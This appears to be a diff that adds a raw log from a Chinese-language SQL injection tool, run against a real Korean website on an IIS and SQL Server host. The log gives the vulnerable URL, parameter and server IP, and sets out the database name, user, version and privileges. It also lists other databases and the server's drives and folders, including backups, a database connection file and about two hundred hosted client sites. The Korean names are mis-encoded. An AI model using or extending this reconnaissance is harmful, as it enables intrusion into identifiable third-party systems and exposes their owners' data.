@@ -1,0 +1,399 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kaaa.co.kr/html/board/Down.asp?fileName=2011%B3%E2%20%B4%BA%BF%E5%C6%E4%BD%BA%C6%BC%B9%DF%20%C3%E2%C7%B0%C0%DB%20%B8%F0%C1%FD%20%BF%E4%B0%AD.hwp&table=brd_board&folderName=More&num=644
+ ·页面标题：
+ ·参数:fileName=2011%B3%E2%20%B4%BA%BF%E5%C6%E4%BD%BA%C6%BC%B9%DF%20%C3%E2%C7%B0%C0%DB%20%B8%F0%C1%FD%20%BF%E4%B0%AD.hwp&table=brd_board&folderName=More&num=644
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.116.112.68
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:38:47 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Disposition: attachment;fileName=2011斥 春垮其胶萍惯 免前累 葛笼 夸碍.hwp
+Content-Length: 271872
+Content-Type: Application/UnKnown
+Set-Cookie: ASPSESSIONIDAACTDAQS=GHEMJCMAADPLBAOCCPGKNAPL; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：kaaa_new
+- 用户名：kaaadbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：HANGULINTERNET1
+- 服务名：MSSQLSERVER
+- 系统用户名：kaaadbo
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+adnpr	d:\Program Files\Microsoft SQL Server\MSSQL\data\adnpr_Data.MDF	
+alcolhol	d:\Program Files\Microsoft SQL Server\MSSQL\data\alcolhol_Data.MDF	
+allcomm	d:\Program Files\Microsoft SQL Server\MSSQL\data\allcomm_Data.MDF	
+amheung	D:\Program Files\Microsoft SQL Server\MSSQL\data\amheung_Data.MDF	
+anmyunDo	d:\Program Files\Microsoft SQL Server\MSSQL\data\anmyunDo_Data.MDF	
+ansanquick	d:\Program Files\Microsoft SQL Server\MSSQL\data\ansanquick_Data.MDF	
+asia	d:\Program Files\Microsoft SQL Server\MSSQL\data\asia_Data.MDF	
+asung	d:\Program Files\Microsoft SQL Server\MSSQL\data\asung_Data.MDF	
+bada	d:\Program Files\Microsoft SQL Server\MSSQL\data\bada_Data.MDF	
+bangei	d:\Program Files\Microsoft SQL Server\MSSQL\data\bangei_Data.MDF	
+battery	d:\Program Files\Microsoft SQL Server\MSSQL\data\battery_Data.MDF	
+boksil	d:\Program Files\Microsoft SQL Server\MSSQL\data\boksil_Data.MDF	
+bpgaza	d:\Program Files\Microsoft SQL Server\MSSQL\data\bpgaza_Data.MDF	
+bpgaza1	d:\Program Files\Microsoft SQL Server\MSSQL\data\bpgaza1_Data.MDF	
+bpgaza2	D:\Program Files\Microsoft SQL Server\MSSQL\data\bpgaza2_Data.MDF	
+bugs	d:\Program Files\Microsoft SQL Server\MSSQL\data\bugs_Data.MDF	
+bugs_academy	d:\Program Files\Microsoft SQL Server\MSSQL\data\bugs_academy_Data.MDF	
+busan_kyung	d:\Program Files\Microsoft SQL Server\MSSQL\data\busan_kyung_Data.MDF	
+busan_kyung3	d:\Program Files\Microsoft SQL Server\MSSQL\data\busan_kyung3_Data.MDF	
+busan_kyung4	D:\Program Files\Microsoft SQL Server\MSSQL\data\busan_kyung4_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	HANGULINTERNET1	1100	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	HANGULINTERNET1	1100	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	HANGULINTERNET1	6168	AWAITING COMMAND		
+Internet Information Services	sleeping	HANGULINTERNET1	6168	AWAITING COMMAND		
+Internet Information Services	sleeping	HANGULINTERNET1	6168	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+HANGULINTERNET1	SQL Server	SQLOLEDB	HANGULINTERNET1		HANGULINTERNET1	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of E:: 
+
+DB\
+I386\
+RECYCLER\
+System Volume Information\
+True Image 9.1.3718 Enterprise Server\
+
+Dir of F:: 
+
+Hangul0000\
+INIpay41\
+INIpay50_ASP\
+INIpay50\
+mysql-connector-odbc-3.51.26-win32\
+New茄臂苞牢磐齿-hangulinternet.com\
+Parking\
+ppurio_sms\
+RECYCLER\
+SCM固叼绢-shop.scmmedia.co.kr\
+System Volume Information\
+temp\
+tmp\
+Trueimage\
+unitel\
+website\
+whoispr.com\
+whoispr-test\
+win_db_back\
+dongwonara_db_201007050400.BAK
+Hbackup.zip
+util.zip
+whoispr.com.zip
+
+Dir of F:\unitel: 
+
+MainLog\
+Monitor\
+
+Dir of F:\website: 
+一次性获取失败，正在批次获取……
+
+啊唱林琶包府-ganaclean.co.kr\
+癌坷惯傈扁-gabobaljunki.com\
+俺惯角炼篮快抛胶飘-devcew.com\
+芭己魂傈-keosung.com\
+白喉圈官-gamblehall.co.kr\
+版扁档矫傍荤畴悼炼钦-gicolu.co.kr\
+绊妨牢伙柳蕊-koreaginseng-shop.co.kr\
+背备技惑-koygoo.com\
+备肺版盔技扁-aircomp119.com\
+惫老傍累家_kookil.com\
+惫力酒飘-kukjeart.co.kr\
+陛己啊胶橇扼磊-ksgas.co.kr\
+陛芒傈扁-kckumchang.co.kr\
+鳖葛菩记-camofashion.com\
+厕狼荤牢-ggumsa.co.kr\
+郴绊氢惑锰-ijscfarm.com\
+畴寸扁诀-nodang21.co.kr\
+踌锅角滚权-silverhome.kr\
+促促沥焊烹脚-ksvan.com\
+促己抛农-spjoint.co.kr\
+促快府溃葫-congcong.co.kr\
+窜眉萍-oorit.com\
+措扒傍炼矫胶袍-lgman.co.kr\
+措包飞盔抗丑蛆_back-skyvillage.co.kr\
+措包飞盔抗丑蛆s-skyvillage.co.kr\
+措悼扁傍荤(己悼魂诀)-universaljoint.kr\
+措锋秦款-dalong.co.kr\
+措己魂诀\
+措价吝傈扁-hyosungmortor.co.kr\
+措芒扁诀-igoodle.co.kr\
+措芒寸备犁丰-daechangbilliard.com\
+措茄扁诀荤-daehan7804.co.kr\
+措茄公抗醚楷钦雀-krmf.org\
+措茄救版荤-optic.or.kr\
+措茄傈扁-dhelec.co.kr\
+措茄敲扼胶平-plastic21.com\
+悼覆陛加-dlmet.com\
+悼何府撇具备窜-dbbaseball.co.kr\
+悼脚咆-dongst.com\
+悼快陛加-dwometal.co.kr\
+悼快唱扼-dwonara.co.kr\
+悼盔乔骏-dongwonpump.com\
+叼瘤呕瘤畴雇胶-mammaprint.co.kr\
+尔榜橇-langgolf.net\
+贰根(泅措魔备惑荤)-raimong.co.kr\
+钒虐滚胶-luckybus.co.kr\
+肺纳飘辑匡-rocketseoul.co.kr\
+府坷傀爹圈免厘哼其-riofs.com\
+父巢背雀-9815.co.kr\
+概老辆钦扒绵-nusu112.co.kr\
+皋府飘-merit.co.kr\
+皋府飘OA隔-meritoamall.co.kr\
+皋呕亏胶-metalworks.co.kr\
+葛炮父府厘己-asanmotel.co.kr\
+固贰绢切季磐-c-school.co.kr\
+瓜澜俺惯-medem.co.kr\
+官促-ba-da.co.kr\
+官弗犁扒绵犁俺惯楷钦-rea.or.kr\
+瑰单府唱扼(技规傈瘤)-narabt.co.kr\
+规捞箕宏漠惫荐- bangi.co.kr\
+归款寸茄狼盔-backwoon.co.kr\
+汗角捞丑魂-boksili.co.kr\
+何魂版符-ubcr.or.kr\
+轰萍敲贰呈-bpgaza.com\
+谎府坷 SMS\
+荤疙寸-samyungdang.com\
+伙傍-6404.co.kr\
+伙己罚飘墨-samsungrent.com\
+伙己荤-esusun.co.kr\
+伙己牢尖-colorcard.kr\
+伙盔澜氢-samwonsound.co.kr\
+伙吝辆钦扒汲-sjcon.com\
+伙蕊企瞒碱俏隔-samheungmotors.net\
+惑菩付风-sangpaemaru.co.kr\
+辑版浚瘤聪绢傅-skeng21.com\
+辑蓖器牧亥记傍牢吝俺荤-conventionland.co.kr\
+辑覆家颇-sofa114.co.kr\
+辑快蜡烹-suwo.co.kr\
+急柳沥焊-sunjinnetworks.com\
+急柳橇扼磊-sjplaza.co.kr\
+己焊玫阜-sbtent.co.kr\
+技盔汲厚浚瘤聪绢傅-sewonsb.co.kr\
+技捞客堡切-seiwakorea.com\
+技瘤惑荤-seji-w.com\
+技拳抛农愁矾瘤-sehwatechnology.com\
+贾皋咯青荤-soulmatetour.co.kr\
+贾咆-soltech.co.kr\
+胶困飘权农府醋-isweethome.kr\
+铰林采丑盔-sj365.kr\
+铰拳器厘-boxbank.com\
+脚急巩-sinsunmun.com\
+角肺鞠荤快唱-silloamsauna.com\
+街拌力促-sktea.kr\
+揪俊胶纳固漠-chchemical.co.kr\
+揪骏纳捞-www.cmkkt.co.kr\
+揪骏纳捞-www.cmkkt.com\
+酒己力距-asungp.com\
+酒矫酒玫阜-asiatent.co.kr\
+酒捞坊飘-i-rent.co.kr\
+救搁档-anmyun-do.co.kr\
+救魂狞辑厚胶-ansanquick.co.kr\
+舅妮吝刀-ksi1339.co.kr\
+局靛矩乔舅胶固胶-smithad.com\
+剧乞磨谰魂闺府-cypvalley.com\
+俊胶力捞臂肺国-sjglobal.co.kr\
+竣胶欺飘-expertkorea.co.kr\
+咯林健啊付买龙规-jjimbang.co.kr\
+楷措过公措切盔-yonseigsl.ac.kr\
+楷规魂诀-yeonbang.co.kr\
+楷技措过公盔快雀-yonseigsl.net\
+康堡林拱-ykjumul.com\
+康傣(秦函荐魂)-yd-daegemall.com\
+康荐傈磊傍诀-yselec.kr\
+抗覆盔-yelimwon.co.kr\
+坷坊瘤农府醋-orange112.com\
+坷脚版沥脚苞-npdoctor.net\
+棵哪-allcommad.co.kr\
+困教胶鸥-wishingstar.co.kr\
+蜡聪内颊秦荤沥-uldcon.co.kr\
+篮磊匙颊父滴-ejsonmandu.com\
+览鞭券磊备炼窜-emg119.co.kr\
+捞堡切扁扁-leeoptics.co.kr\
+捞荤齿-24.ne.kr\
+捞胶飘惯傈扁-eastgenerator.co.kr\
+劳胶敲肺胶器明-expsports.co.kr\
+牢玫硅超矫-boatnaksi.com\
+牢蛆胶刨-ihsten.co.kr\
+磊楷窍玫-mat21.co.kr\
+厘牢抛农-jangeen.com\
+傈窜桂农-www.jundanbank.com\
+傈窜瘤堡绊付阑-jundanjihome.com\
+傈家康酒墨单固-jeonsoyoung.com\
+沥惑吝惫绢切盔-jschinese.co.kr\
+沥荐辆钦扁傍-jungsu21.co.kr\
+沥快何悼魂-jwconsulting.co.kr\
+沥沥脚苞狼盔-ksi9112.co.kr\
+力老官迪背角-jeilbaduk.com\
+力老沥傍-moldmaker.co.kr\
+力林捧磊-jejutuja.co.kr\
+吝盔-吝盔.kr\
+瘤叼俊胶浚瘤聪绢傅-gdse.co.kr\
+瘤府魂饭历-jirisanleisure.co.kr\
+柳己惯傈扁-jinsunggen.co.kr\
+柳己浚瘤聪绢傅-jinseongeng.co.kr\
+柳己沥剐-ejinsung.com\
+柳林畴牢老磊府芒免瘤盔季磐-jej.or.kr\
+芒覆扁拌-doosanch.com\
+没荐榜魂厘-benegol.co.kr\
+没快牢仿(溃爹内府酒)-wk114.co.kr\
+没切悼烤朝辑寸-chenghak.kr\
+檬盔付荤瘤-cho1.co.kr\
+冕老傈扁-choonil.co.kr\
+面合措切背绵魂切苞-animalscience.co.kr\
+魔肥背醚雀-koreabaptist.net\
+墨其荤拌-cafesagye.com\
+纳捞俊胶-k-st.co.kr\
+纳捞咆-iktec.kr\
+乃畴-kennou.co.kr\
+钮候怕农-toolpark.co.kr\
+虐高胶-kimexairsea.com\
+啪钠泼\
+怕堡惑荤\
+咆胶桂农-texbank.co.kr\
+配快老饭红-eleven11.co.kr\
+萍俊胶酒捞沥焊烹脚-tsidata.co.kr\
+汽酒墨单固-formacademy.com\
+浅荐瘤府村哪-poongsugili.com\
+茄惫堡绊诀蛆雀-kaaa.co.kr\
+茄惫酒墨单固-kacchoir.com\
+茄臂苞牢磐齿包访\
+茄付澜农府醋-hanmaum21.com\
+茄焊郴厘扒汲-hanbo04.com\
+茄贾\
+茄贾傈磊-avsound.co.kr\
+茄脚扁拌-hsrotary.co.kr\
+茄脚魂诀-han-shin.kr\
+茄脚凯包府魂诀-hshmi.com\
+茄剧寒瘤惑荤-hywallp.co.kr\
+茄牢齿-haninnet.co.kr\
+茄老魂诀-hanil-hinc.co.kr\
+茄老家颇-hilsofa.com\
+茄老劳胶橇饭胶-han124.com\
+泅措玫阜-hdawning.com\
+泅措能农府飘-hyundaec.co.kr\
+泅霖魂诀-hyunjunbumpershop.co.kr\
+驱碍沥剐-h-gang.co.kr\
+全盔官捞坷酒弊肺-hwbiovital.com\
+拳己扁诀-hsent.co.kr\
+拳己CND-hscnd.co
+Dir of F:\website\茄牢齿-haninnet.co.kr: 
+
+
+Dir of F:\website\茄老魂诀-hanil-hinc.co.kr: 
+
+
+Dir of F:\website\茄牢齿-haninnet.co.kr: 
+
+
+Dir of F:\website\茄老魂诀-hanil-hinc.co.kr: 
+
+
+Dir of F:\website\茄牢齿-haninnet.co.kr: 
+
+
+Dir of F:\website\促促沥焊烹脚-ksvan.com: 
+
+
+Dir of F:\website\郴绊氢惑锰-ijscfarm.com: 
+
+
+Dir of F:\website\啊唱林琶包府-ganaclean.co.kr: 
+
+
+Dir of F:\whoispr.com: 
+
+site\
+
+Dir of F:\whoispr.com\site: 
+
+admin\
+bank\
+board\
+count\
+cpzone\
+css\
+customer\
+editer\
+erp\
+errorPage_2\
+errorPage\
+flash\
+images\
+images2\
+include\
+mail\
+main\
+media\
+member\
+mypage\
+new_images\
+new_main\
+new1_main\
+popup\
+product\
+send\
+shop\
+skin\
+sso\
+upload\
+w3c\
+whoismember\
+dbcon.asp
+global.asa
+index.asp
+index.html
+wait.asp
+
+Dir of F:\website\惫老傍累家_kookil.com: 
+
+
